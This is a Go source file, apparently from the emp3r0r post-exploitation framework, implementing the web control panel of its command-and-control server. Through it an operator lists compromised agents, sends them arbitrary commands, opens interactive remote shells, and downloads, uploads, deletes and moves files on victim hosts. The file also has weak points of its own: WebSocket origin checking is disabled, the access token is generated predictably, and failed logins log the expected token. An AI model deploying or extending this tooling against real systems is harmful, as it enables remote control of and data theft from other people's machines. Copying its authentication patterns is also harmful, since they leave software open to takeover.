package server

import (
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"math/big"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/fxamacker/cbor/v2"
	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/ftp"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

var (
	// Web server instance
	WebServer     *http.Server
	WebServerCtx  context.Context
	WebServerCancel context.CancelFunc

	// WebSocket upgrader
	wsUpgrader = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool {
			return true // 允许所有来源（生产环境应该限制）
		},
		ReadBufferSize:  1024,
		WriteBufferSize: 1024,
	}

	// WebSocket 连接的客户端
	webClients sync.Map

	// 用于广播消息的 channel
	broadcastChan = make(chan []byte, 100)
)

// WebConfig Web 服务器配置
type WebConfig struct {
	Port     int
	CertFile string
	KeyFile  string
	Token    string // 访问令牌
}

// WebMessage WebSocket 消息格式
type WebMessage struct {
	Type      string      `json:"type"`
	Data      interface{} `json:"data"`
	Timestamp string      `json:"timestamp"`
}

// InitWebServer 初始化 Web 服务器
func InitWebServer(port int) {
	WebServerCtx, WebServerCancel = context.WithCancel(context.Background())

	// 生成或加载证书
	certDir := filepath.Join(live.EmpWorkSpace, "web_certs")
	os.MkdirAll(certDir, 0700)

	certFile := filepath.Join(certDir, "server.crt")
	keyFile := filepath.Join(certDir, "server.key")

	// 如果证书不存在，生成自签名证书
	if _, err := os.Stat(certFile); os.IsNotExist(err) {
		logging.Infof("Generating self-signed certificate for web server...")
		if err := generateSelfSignedCert(certFile, keyFile); err != nil {
			logging.Fatalf("Failed to generate certificate: %v", err)
		}
	}

	// 生成访问令牌
	tokenFile := filepath.Join(live.EmpWorkSpace, "web_token.txt")
	token := loadOrGenerateToken(tokenFile)

	// 设置路由
	r := mux.NewRouter()

	// Web UI counts as an online operator for presence tracking
	MarkOperatorOnline("web-ui")

	// Set FTP ExecCmd to send commands directly via agents.SendCmd with proper job tracking
	ftp.ExecCmd = func(cmd, jobID, tag string) error {
		if jobID == "" {
			jobID = fmt.Sprintf("ftp-%d", time.Now().UnixNano())
		}
		// mark known job to avoid race in message tunnel handler
		live.CmdTime.Store(jobID, time.Now().Format("2006-01-02 15:04:05.999999999 -0700 MST"))
		agent := agents.GetAgentByTag(tag)
		if agent == nil {
			return fmt.Errorf("agent not found: %s", tag)
		}
		return agents.SendCmd(cmd, jobID, agent)
	}
	logging.Infof("FTP ExecCmd bound to direct agent sender for Web UI")

	// 启动虚拟 operator 保活 goroutine，防止 idle timeout 断开 agents
	go func() {
		ticker := time.NewTicker(60 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				MarkOperatorOnline("web-ui")
			case <-WebServerCtx.Done():
				return
			}
		}
	}()

	// API 路由
	api := r.PathPrefix("/api").Subrouter()
	
	// 健康检查
	api.HandleFunc("/health", handleHealth).Methods("GET")
	
	// 认证中间件（用于需要认证的 API）
	authApi := api.PathPrefix("").Subrouter()
	authApi.Use(authMiddleware(token))
	
	// Agent API
	authApi.HandleFunc("/agents", handleWebListAgents).Methods("GET")
	authApi.HandleFunc("/agents/active", handleWebSetActiveAgent).Methods("POST")
	authApi.HandleFunc("/agents/forget", handleWebForgetAgent).Methods("POST")
	
	// 命令 API
	authApi.HandleFunc("/command", handleWebSendCommand).Methods("POST")

	// CF relay 用量面板（Workers/DO 免费配额燃烧度）
	authApi.HandleFunc("/relay-quota", handleWebRelayQuota).Methods("GET")
	
	// 文件管理 API
	authApi.HandleFunc("/ls", handleWebListFiles).Methods("POST")
	authApi.HandleFunc("/download", handleWebDownloadFile).Methods("POST")
	authApi.HandleFunc("/upload", handleWebUploadFile).Methods("POST")
	authApi.HandleFunc("/rm", handleWebRemove).Methods("POST")
	authApi.HandleFunc("/mkdir", handleWebMkdir).Methods("POST")
	// Extra FS ops
	authApi.HandleFunc("/stat", handleWebStat).Methods("POST")
	authApi.HandleFunc("/cp", handleWebCopy).Methods("POST")
	authApi.HandleFunc("/mv", handleWebMove).Methods("POST")

	// 模块 API
	authApi.HandleFunc("/modules", handleWebListModules).Methods("GET")
	
	// WebSocket
	authApi.HandleFunc("/ws", handleWebSocket)

	// 静态文件服务（前端）
	webDir := filepath.Join(live.EmpWorkSpace, "web")
	if _, err := os.Stat(webDir); err == nil {
		r.PathPrefix("/").Handler(http.FileServer(http.Dir(webDir)))
	}

	// TLS 配置
	tlsConfig := &tls.Config{
		MinVersion: tls.VersionTLS12,
		// 只使用 HTTP/1.1，这样 WebSocket upgrade 才能正常工作
		// gorilla/websocket 不支持 HTTP/2 的 CONNECT-协议
		NextProtos: []string{"http/1.1"},
	}

	WebServer = &http.Server{
		Addr:      fmt.Sprintf(":%d", port),
		Handler:   r,
		TLSConfig: tlsConfig,
	}

	// 启动广播协程
	go broadcastHandler()

	logging.Successf("🚀 Starting Web server at port %d", port)
	logging.Successf("🌐 Access token: %s", token)
	logging.Successf("🔒 Web UI: https://localhost:%d", port)

	// 启动服务器
	go func() {
		if err := WebServer.ListenAndServeTLS(certFile, keyFile); err != nil && err != http.ErrServerClosed {
			logging.Errorf("Web server error: %v", err)
		}
	}()
}

// loadOrGenerateToken 加载或生成访问令牌
func loadOrGenerateToken(path string) string {
	data, err := os.ReadFile(path)
	if err == nil {
		return string(data)
	}

	// 生成新令牌
	token := fmt.Sprintf("emp3r0r-%s", generateRandomString(32))
	os.WriteFile(path, []byte(token), 0600)
	return token
}

// generateRandomString 生成随机字符串
func generateRandomString(length int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := make([]byte, length)
	for i := range result {
		result[i] = chars[time.Now().UnixNano()%int64(len(chars))]
		time.Sleep(time.Nanosecond)
	}
	return string(result)
}

// authMiddleware 认证中间件
func authMiddleware(token string) mux.MiddlewareFunc {
	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			// 检查 Authorization header
			authHeader := r.Header.Get("Authorization")
			
			// 对于 WebSocket 连接，也检查 query 参数中的 session/token
			if authHeader == "" {
				sessionID := r.URL.Query().Get("session")
				if sessionID != "" {
					authHeader = "Bearer " + sessionID
				}
			}

			if authHeader == "" {
				logging.Errorf("WebSocket auth failed: no auth header, session=%q", r.URL.Query().Get("session"))
				http.Error(w, "Unauthorized", http.StatusUnauthorized)
				return
			}

			// 验证 token
			if authHeader != "Bearer "+token {
				logging.Errorf("WebSocket auth failed: header=%q, expected=%q", authHeader, "Bearer "+token)
				http.Error(w, "Invalid token", http.StatusUnauthorized)
				return
			}

			next.ServeHTTP(w, r)
		})
	}
}

// handleHealth 健康检查
func handleHealth(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

// handleWebListAgents 获取 Agent 列表
func handleWebListAgents(w http.ResponseWriter, r *http.Request) {
	agentList := agents.GetConnectedAgents()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(agentList)
}

// handleWebSetActiveAgent 设置当前活动的 Agent
func handleWebSetActiveAgent(w http.ResponseWriter, r *http.Request) {
	var req struct {
		AgentTag string `json:"AgentTag"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	agents.SetActiveAgent(req.AgentTag)

	// 返回当前活动的 Agent
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(live.ActiveAgent)
}

// handleWebForgetAgent 删除 Agent（重置其 TOFU 身份，允许重新登记）
func handleWebForgetAgent(w http.ResponseWriter, r *http.Request) {
	var req struct {
		AgentTag string `json:"AgentTag"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	uuid := strings.TrimSpace(req.AgentTag)
	if unquoted, err := strconv.Unquote(uuid); err == nil {
		uuid = unquoted
	}
	if uuid == "" {
		http.Error(w, "Agent UUID is empty", http.StatusBadRequest)
		return
	}

	// 支持用 tag 解析出 UUID
	if byTag := agents.GetAgentByTag(uuid); byTag != nil && byTag.UUID != "" {
		uuid = byTag.UUID
	}

	if err := agents.RemoveAgent(uuid); err != nil {
		logging.Errorf("handleWebForgetAgent: %v", err)
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	// 清理悬空指针：被遗忘的 agent 若是当前选中目标，重置之。
	// 否则 Console/PTY 会静默指向已删除的 agent（TTY 按钮禁用且无提示）。
	if live.ActiveAgent != nil && live.ActiveAgent.UUID == uuid {
		live.ActiveAgent = nil
		logging.Infof("handleWebForgetAgent: active agent reset (was the forgotten agent)")
	}

	logging.Successf("handleWebForgetAgent: agent %s removed (identity reset, will re-enroll on next connect)", uuid)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "ok", "uuid": uuid})
}

// handleWebSendCommand 发送命令
func handleWebSendCommand(w http.ResponseWriter, r *http.Request) {
	var req struct {
		AgentTag string            `json:"AgentTag"`
		Action   string            `json:"Action"`
		Command  string            `json:"Command"`
		JobID    string            `json:"JobID"`
		Options  map[string]string `json:"Options"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	// 发送命令
	agent := agents.GetAgentByTag(req.AgentTag)
	if agent == nil {
		logging.Errorf("handleWebSendCommand: agent not found for tag '%s'", req.AgentTag)
		http.Error(w, "agent not found", http.StatusNotFound)
		return
	}
	// 先登记 JobID，避免响应比登记更快导致 "unknown job ID" 被丢弃
	live.CmdTime.Store(req.JobID, time.Now().Format("2006-01-02 15:04:05.999999999 -0700 MST"))

	logging.Infof("handleWebSendCommand: sending command '%s' to agent '%s' (jobID=%s)", req.Command, agent.Tag, req.JobID)
	if err := agents.SendCmd(req.Command, req.JobID, agent); err != nil {
		logging.Errorf("handleWebSendCommand: SendCmd failed: %v", err)
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	logging.Infof("handleWebSendCommand: command sent successfully")

	w.WriteHeader(http.StatusOK)
}

// handleWebListModules 获取模块列表
func handleWebListModules(w http.ResponseWriter, r *http.Request) {
	modules := make(map[string]*def.ModuleConfig)
	def.Modules.Range(func(key, value interface{}) bool {
		modules[key.(string)] = value.(*def.ModuleConfig)
		return true
	})

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(modules)
}

// handleWebListFiles 列出远程目录文件
func handleWebListFiles(w http.ResponseWriter, r *http.Request) {
	var req struct {
		AgentTag string `json:"AgentTag"`
		Path     string `json:"Path"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	// 获取 agent
	agent := agents.GetAgentByTag(req.AgentTag)
	if agent == nil {
		http.Error(w, "agent not found", http.StatusNotFound)
		return
	}

	// 发送 ls 命令
	jobID := fmt.Sprintf("ls-%d", time.Now().UnixNano())
	start := time.Now()
	logging.Infof("[LS] start job=%s agent=%s path=%s", jobID, agent.Tag, req.Path)
	// Use core command with explicit flag and proper quoting to handle spaces
	cmd := fmt.Sprintf("ls --dst %s", strconv.Quote(req.Path))
	
	// 先创建 channel，再存储 JobID，最后发送命令
	ready := make(chan struct{}, 1)
	live.CmdResultsReady.Store(jobID, ready)
	defer live.CmdResultsReady.Delete(jobID)
	
	live.CmdTime.Store(jobID, time.Now().Format("2006-01-02 15:04:05.999999999 -0700 MST"))
	
	if err := agents.SendCmd(cmd, jobID, agent); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	
	// 等待响应
	select {
	case <-ready:
		logging.Infof("[LS] done job=%s elapsed=%s", jobID, time.Since(start))
		// 收到响应
	case <-time.After(10 * time.Second):
		logging.Warningf("[LS] timeout job=%s elapsed=%s", jobID, time.Since(start))
		http.Error(w, "timeout waiting for response", http.StatusGatewayTimeout)
		return
	}
	
	if result, ok := live.CmdResults.Load(jobID); ok {
		live.CmdResults.Delete(jobID)
		response := []byte(result.(string))
		
		// 尝试解码 CBOR
		var dentries []util.Dentry
		if err := cbor.Unmarshal(response, &dentries); err == nil {
			// 成功解码，返回 JSON
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(dentries)
			return
		}
		
		// 如果 CBOR 解码失败，返回原始文本
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{"text": string(response)})
		return
	}
	
	http.Error(w, "no response received", http.StatusInternalServerError)
}

// handleWebDownloadFile 下载文件（从 agent 获取）
func handleWebDownloadFile(w http.ResponseWriter, r *http.Request) {
	var req struct {
		AgentTag string `json:"AgentTag"`
		FilePath string `json:"FilePath"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	// 获取 agent
	agent := agents.GetAgentByTag(req.AgentTag)
	if agent == nil {
		http.Error(w, "agent not found", http.StatusNotFound)
		return
	}

	// 优先：走 FTP 流（适合二进制/大文件）
	if ftpSh, err := ftp.GetFile(req.FilePath, agent); err == nil && ftpSh != nil {
		logging.Infof("[DOWNLOAD/FTP] start token=%s agent=%s path=%s", ftpSh.Token, agent.Tag, req.FilePath)
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", filepath.Base(req.FilePath)))
		// 使用 Web 直连 sink，把 FTP 数据直接写入 HTTP 响应
		sink := RegisterWebFTPSink(ftpSh.Token)
		defer closeWebFTPSink(ftpSh.Token)
		deadline := time.Now().Add(10 * time.Second)
		start := time.Now()
		for {
			select {
			case chunk, ok := <-sink.ch:
				if !ok {
					return
				}
				if len(chunk) > 0 {
					if _, err := w.Write(chunk); err != nil {
						return
					}
					if f, ok := w.(http.Flusher); ok {
						f.Flush()
					}
				}
				deadline = time.Now().Add(10 * time.Second)
			case <-time.After(time.Until(deadline)):
				logging.Warningf("[DOWNLOAD/FTP] timeout token=%s elapsed=%s", ftpSh.Token, time.Since(start))
				http.Error(w, "ftp stream timeout", http.StatusGatewayTimeout)
				return
			}
		}
	}

	// 回退：小文本直接 cat --dst
	jobID := fmt.Sprintf("get-%d", time.Now().UnixNano())
	start := time.Now()
	logging.Infof("[DOWNLOAD/CAT] start job=%s agent=%s path=%s", jobID, agent.Tag, req.FilePath)
	cmd := fmt.Sprintf("cat --dst %s", strconv.Quote(req.FilePath))
	ready := make(chan struct{}, 1)
	live.CmdResultsReady.Store(jobID, ready)
	defer live.CmdResultsReady.Delete(jobID)
	live.CmdTime.Store(jobID, time.Now().Format("2006-01-02 15:04:05.999999999 -0700 MST"))
	if err := agents.SendCmd(cmd, jobID, agent); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	select {
	case <-ready:
		logging.Infof("[DOWNLOAD/CAT] done job=%s elapsed=%s", jobID, time.Since(start))
	case <-time.After(15 * time.Second):
		logging.Warningf("[DOWNLOAD/CAT] timeout job=%s elapsed=%s", jobID, time.Since(start))
		http.Error(w, "timeout waiting for response", http.StatusGatewayTimeout)
		return
	}
	if result, ok := live.CmdResults.Load(jobID); ok {
		live.CmdResults.Delete(jobID)
		text := result.(string)
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", filepath.Base(req.FilePath)))
		_, _ = w.Write([]byte(text))
		return
	}
	http.Error(w, "no response received", http.StatusInternalServerError)
}

// handleWebUploadFile 上传文件（发送到 agent）
func handleWebUploadFile(w http.ResponseWriter, r *http.Request) {
	var req struct {
		AgentTag string `json:"AgentTag"`
		FilePath string `json:"FilePath"`
		Content  string `json:"Content"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	// 获取 agent
	agent := agents.GetAgentByTag(req.AgentTag)
	if agent == nil {
		http.Error(w, "agent not found", http.StatusNotFound)
		return
	}

	jobID := fmt.Sprintf("put-%d", time.Now().UnixNano())
	cmd := fmt.Sprintf("put --path %s --addr data:text/plain;base64,%s --mem false", strconv.Quote(req.FilePath), req.Content)
	logging.Infof("[UPLOAD] start job=%s agent=%s path=%s size_b64=%d", jobID, agent.Tag, req.FilePath, len(req.Content))

	// 登记时间（无需等待）
	live.CmdTime.Store(jobID, time.Now().Format("2006-01-02 15:04:05.999999999 -0700 MST"))

	if err := agents.SendCmd(cmd, jobID, agent); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "uploaded"})
}

// handleWebRemove 删除文件或目录
func handleWebRemove(w http.ResponseWriter, r *http.Request) {
	var req struct {
		AgentTag string `json:"AgentTag"`
		Path     string `json:"Path"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	agent := agents.GetAgentByTag(req.AgentTag)
	if agent == nil {
		http.Error(w, "agent not found", http.StatusNotFound)
		return
	}
	jobID := fmt.Sprintf("rm-%d", time.Now().UnixNano())
	cmd := fmt.Sprintf("rm --dst %s", strconv.Quote(req.Path))
	start := time.Now()
	logging.Infof("[RM] start job=%s agent=%s path=%s", jobID, agent.Tag, req.Path)
	ready := make(chan struct{}, 1)
	live.CmdResultsReady.Store(jobID, ready)
	defer live.CmdResultsReady.Delete(jobID)
	live.CmdTime.Store(jobID, time.Now().Format("2006-01-02 15:04:05.999999999 -0700 MST"))
	if err := agents.SendCmd(cmd, jobID, agent); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	select {
	case <-ready:
		logging.Infof("[RM] done job=%s elapsed=%s", jobID, time.Since(start))
		w.WriteHeader(http.StatusOK)
		return
	case <-time.After(10 * time.Second):
		logging.Warningf("[RM] timeout job=%s elapsed=%s", jobID, time.Since(start))
		http.Error(w, "timeout", http.StatusGatewayTimeout)
		return
	}
}

// handleWebMkdir 创建目录
func handleWebMkdir(w http.ResponseWriter, r *http.Request) {
	var req struct {
		AgentTag string `json:"AgentTag"`
		Path     string `json:"Path"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	agent := agents.GetAgentByTag(req.AgentTag)
	if agent == nil {
		http.Error(w, "agent not found", http.StatusNotFound)
		return
	}
	jobID := fmt.Sprintf("mkdir-%d", time.Now().UnixNano())
	cmd := fmt.Sprintf("mkdir --dst %s", strconv.Quote(req.Path))
	start := time.Now()
	logging.Infof("[MKDIR] start job=%s agent=%s path=%s", jobID, agent.Tag, req.Path)
	ready := make(chan struct{}, 1)
	live.CmdResultsReady.Store(jobID, ready)
	defer live.CmdResultsReady.Delete(jobID)
	live.CmdTime.Store(jobID, time.Now().Format("2006-01-02 15:04:05.999999999 -0700 MST"))
	if err := agents.SendCmd(cmd, jobID, agent); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	select {
	case <-ready:
		logging.Infof("[MKDIR] done job=%s elapsed=%s", jobID, time.Since(start))
		w.WriteHeader(http.StatusOK)
		return
	case <-time.After(10 * time.Second):
		logging.Warningf("[MKDIR] timeout job=%s elapsed=%s", jobID, time.Since(start))
		http.Error(w, "timeout", http.StatusGatewayTimeout)
		return
	}
}

// handleWebStat 返回文件属性
func handleWebStat(w http.ResponseWriter, r *http.Request) {
	var req struct {
		AgentTag string `json:"AgentTag"`
		Path     string `json:"Path"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	agent := agents.GetAgentByTag(req.AgentTag)
	if agent == nil {
		http.Error(w, "agent not found", http.StatusNotFound)
		return
	}
	jobID := fmt.Sprintf("stat-%d", time.Now().UnixNano())
	cmd := fmt.Sprintf("%s --path %s", def.C2CmdStat, strconv.Quote(req.Path))
	ready := make(chan struct{}, 1)
	live.CmdResultsReady.Store(jobID, ready)
	defer live.CmdResultsReady.Delete(jobID)
	live.CmdTime.Store(jobID, time.Now().Format("2006-01-02 15:04:05.999999999 -0700 MST"))
	start := time.Now()
	logging.Infof("[STAT] start job=%s agent=%s path=%s", jobID, agent.Tag, req.Path)
	if err := agents.SendCmd(cmd, jobID, agent); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	select {
	case <-ready:
		logging.Infof("[STAT] done job=%s elapsed=%s", jobID, time.Since(start))
	case <-time.After(10 * time.Second):
		logging.Warningf("[STAT] timeout job=%s elapsed=%s", jobID, time.Since(start))
		http.Error(w, "timeout", http.StatusGatewayTimeout)
		return
	}
	if result, ok := live.CmdResults.Load(jobID); ok {
		live.CmdResults.Delete(jobID)
		var fs util.FileStat
		if err := cbor.Unmarshal([]byte(result.(string)), &fs); err == nil {
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(fs)
			return
		}
		http.Error(w, "malformed stat response", http.StatusInternalServerError)
		return
	}
	http.Error(w, "no response received", http.StatusInternalServerError)
}

// handleWebCopy 复制文件/目录
func handleWebCopy(w http.ResponseWriter, r *http.Request) {
	var req struct {
		AgentTag string `json:"AgentTag"`
		Src      string `json:"Src"`
		Dst      string `json:"Dst"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	agent := agents.GetAgentByTag(req.AgentTag)
	if agent == nil {
		http.Error(w, "agent not found", http.StatusNotFound)
		return
	}
	jobID := fmt.Sprintf("cp-%d", time.Now().UnixNano())
	cmd := fmt.Sprintf("cp --src %s --dst %s", strconv.Quote(req.Src), strconv.Quote(req.Dst))
	start := time.Now()
	logging.Infof("[CP] start job=%s agent=%s src=%s dst=%s", jobID, agent.Tag, req.Src, req.Dst)
	ready := make(chan struct{}, 1)
	live.CmdResultsReady.Store(jobID, ready)
	defer live.CmdResultsReady.Delete(jobID)
	live.CmdTime.Store(jobID, time.Now().Format("2006-01-02 15:04:05.999999999 -0700 MST"))
	if err := agents.SendCmd(cmd, jobID, agent); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	select {
	case <-ready:
		logging.Infof("[CP] done job=%s elapsed=%s", jobID, time.Since(start))
		w.WriteHeader(http.StatusOK)
		return
	case <-time.After(15 * time.Second):
		logging.Warningf("[CP] timeout job=%s elapsed=%s", jobID, time.Since(start))
		http.Error(w, "timeout", http.StatusGatewayTimeout)
		return
	}
}

// handleWebMove 移动/重命名 文件/目录
func handleWebMove(w http.ResponseWriter, r *http.Request) {
	var req struct {
		AgentTag string `json:"AgentTag"`
		Src      string `json:"Src"`
		Dst      string `json:"Dst"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	agent := agents.GetAgentByTag(req.AgentTag)
	if agent == nil {
		http.Error(w, "agent not found", http.StatusNotFound)
		return
	}
	jobID := fmt.Sprintf("mv-%d", time.Now().UnixNano())
	cmd := fmt.Sprintf("mv --src %s --dst %s", strconv.Quote(req.Src), strconv.Quote(req.Dst))
	start := time.Now()
	logging.Infof("[MV] start job=%s agent=%s src=%s dst=%s", jobID, agent.Tag, req.Src, req.Dst)
	ready := make(chan struct{}, 1)
	live.CmdResultsReady.Store(jobID, ready)
	defer live.CmdResultsReady.Delete(jobID)
	live.CmdTime.Store(jobID, time.Now().Format("2006-01-02 15:04:05.999999999 -0700 MST"))
	if err := agents.SendCmd(cmd, jobID, agent); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	select {
	case <-ready:
		logging.Infof("[MV] done job=%s elapsed=%s", jobID, time.Since(start))
		w.WriteHeader(http.StatusOK)
		return
	case <-time.After(15 * time.Second):
		logging.Warningf("[MV] timeout job=%s elapsed=%s", jobID, time.Since(start))
		http.Error(w, "timeout", http.StatusGatewayTimeout)
		return
	}
}

// handleWebSocket WebSocket 处理
func handleWebSocket(w http.ResponseWriter, r *http.Request) {
	conn, err := wsUpgrader.Upgrade(w, r, nil)
	if err != nil {
		logging.Errorf("WebSocket upgrade failed: %v", err)
		return
	}

	// 获取 session ID
	sessionID := r.URL.Query().Get("session")
	if sessionID == "" {
		sessionID = fmt.Sprintf("web-%d", time.Now().UnixNano())
	}

	client := &webClient{
		conn:      conn,
		sessionID: sessionID,
		send:      make(chan []byte, 256),
	}

	webClients.Store(sessionID, client)

	// 发送欢迎消息
	welcomeMsg := WebMessage{
		Type:      "connected",
		Data:      map[string]string{"session": sessionID},
		Timestamp: time.Now().Format(time.RFC3339),
	}
	if data, err := json.Marshal(welcomeMsg); err == nil {
		client.send <- data
	}

	// 启动读写协程
	go client.writePump()
	go client.readPump()

	logging.Infof("WebSocket client connected: %s", sessionID)
}

// webClient WebSocket 客户端
type webClient struct {
	conn      *websocket.Conn
	sessionID string
	send      chan []byte
}

// readPump 读取消息
func (c *webClient) readPump() {
	defer func() {
		webClients.Delete(c.sessionID)
		c.conn.Close()
		logging.Infof("WebSocket client disconnected: %s", c.sessionID)
	}()

	for {
		_, message, err := c.conn.ReadMessage()
		if err != nil {
			break
		}

		// 处理客户端消息
		var msg WebMessage
		if err := json.Unmarshal(message, &msg); err != nil {
			continue
		}

		// 根据消息类型处理
		switch msg.Type {
		case "ping":
			pong := WebMessage{
				Type:      "pong",
				Timestamp: time.Now().Format(time.RFC3339),
			}
			if data, err := json.Marshal(pong); err == nil {
				c.send <- data
			}
		case "pty_input", "pty_resize", "pty_close":
			handleWebPTYMessage(msg)
		}
	}
}

// ptyMessage is the payload for pty_* WebSocket messages sent from the
// web console (xterm.js) to route stdin / resize / close events to an
// interactive agent shell session.
type ptyMessage struct {
	AgentTag string `json:"AgentTag"`
	JobID    string `json:"JobID"`
	Data     string `json:"Data"` // base64 input for pty_input; dims "rowsxcols" for pty_resize
}

// handleWebPTYMessage forwards a web console PTY event to the target agent
// as an `!shell` C2 command over the message tunnel.
func handleWebPTYMessage(msg WebMessage) {
	data, ok := msg.Data.(map[string]interface{})
	if !ok {
		logging.Warningf("handleWebPTYMessage: invalid payload")
		return
	}
	raw, _ := json.Marshal(data)
	var ptyMsg ptyMessage
	if err := json.Unmarshal(raw, &ptyMsg); err != nil {
		logging.Warningf("handleWebPTYMessage: bad message: %v", err)
		return
	}
	if ptyMsg.AgentTag == "" || ptyMsg.JobID == "" {
		logging.Warningf("handleWebPTYMessage: missing AgentTag/JobID")
		return
	}

	agent := agents.GetAgentByTag(ptyMsg.AgentTag)
	if agent == nil {
		logging.Warningf("handleWebPTYMessage: agent not found: %s", ptyMsg.AgentTag)
		return
	}

	switch msg.Type {
	case "pty_input":
		// Decode the base64 keystrokes and forward them verbatim.
		if ptyMsg.Data == "" {
			return
		}
		input, err := base64.StdEncoding.DecodeString(ptyMsg.Data)
		if err != nil {
			logging.Warningf("handleWebPTYMessage: bad base64 input")
			return
		}
		// --input=<data> form survives arbitrary bytes/leading dashes.
		cmd := def.MsgTunData{
			CmdSlice: []string{def.C2CmdShell, "--input=" + string(input), "--job_id", ptyMsg.JobID},
			Tag:      agent.Tag,
			JobID:    ptyMsg.JobID,
			Time:     time.Now().Format("2006-01-02 15:04:05.999999999 -0700 MST"),
		}
		if err := agents.SendMessageToAgent(&cmd, agent); err != nil {
			logging.Warningf("handleWebPTYMessage: send input failed: %v", err)
		}
	case "pty_resize":
		cmd := def.MsgTunData{
			CmdSlice: []string{def.C2CmdShell, "--resize", ptyMsg.Data, "--job_id", ptyMsg.JobID},
			Tag:      agent.Tag,
			JobID:    ptyMsg.JobID,
			Time:     time.Now().Format("2006-01-02 15:04:05.999999999 -0700 MST"),
		}
		if err := agents.SendMessageToAgent(&cmd, agent); err != nil {
			logging.Warningf("handleWebPTYMessage: send resize failed: %v", err)
		}
	case "pty_close":
		cmd := def.MsgTunData{
			CmdSlice: []string{def.C2CmdShell, "--kill", "--job_id", ptyMsg.JobID},
			Tag:      agent.Tag,
			JobID:    ptyMsg.JobID,
			Time:     time.Now().Format("2006-01-02 15:04:05.999999999 -0700 MST"),
		}
		if err := agents.SendMessageToAgent(&cmd, agent); err != nil {
			logging.Warningf("handleWebPTYMessage: send close failed: %v", err)
		}
	}
}

// writePump 写入消息
func (c *webClient) writePump() {
	ticker := time.NewTicker(30 * time.Second)
	defer func() {
		ticker.Stop()
		c.conn.Close()
	}()

	for {
		select {
		case message, ok := <-c.send:
			if !ok {
				c.conn.WriteMessage(websocket.CloseMessage, []byte{})
				return
			}
			c.conn.WriteMessage(websocket.TextMessage, message)
		case <-ticker.C:
			// 发送 ping
			ping := WebMessage{
				Type:      "ping",
				Timestamp: time.Now().Format(time.RFC3339),
			}
			if data, err := json.Marshal(ping); err == nil {
				c.conn.WriteMessage(websocket.TextMessage, data)
			}
		}
	}
}

// broadcastHandler 广播消息处理
func broadcastHandler() {
	for message := range broadcastChan {
		webClients.Range(func(key, value interface{}) bool {
			client := value.(*webClient)
			select {
			case client.send <- message:
			default:
				// 发送队列已满，关闭连接
				close(client.send)
				webClients.Delete(key)
			}
			return true
		})
	}
}

